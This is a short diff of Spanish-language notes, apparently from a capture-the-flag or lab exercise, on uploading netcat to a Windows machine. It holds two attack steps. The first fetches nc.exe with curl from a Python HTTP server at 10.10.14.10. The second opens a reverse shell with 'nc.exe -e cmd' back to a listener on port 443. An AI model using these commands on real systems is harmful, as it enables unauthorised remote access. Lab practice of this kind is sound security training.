@@ -1,0 +1,7 @@
+subimos un el archivo de netcat haciendo esto --> 
+
+1.Terminal_1 = curl http://10.10.14.10/nc.exe -o nc.exe
+  Terminal_2 = python3 -m http.server 80
+
+2.Terminal_1 = nc.exe -e cmd 10.10.14.10 443
+  Terminal_2 = rlwrap nc -nlvp 443
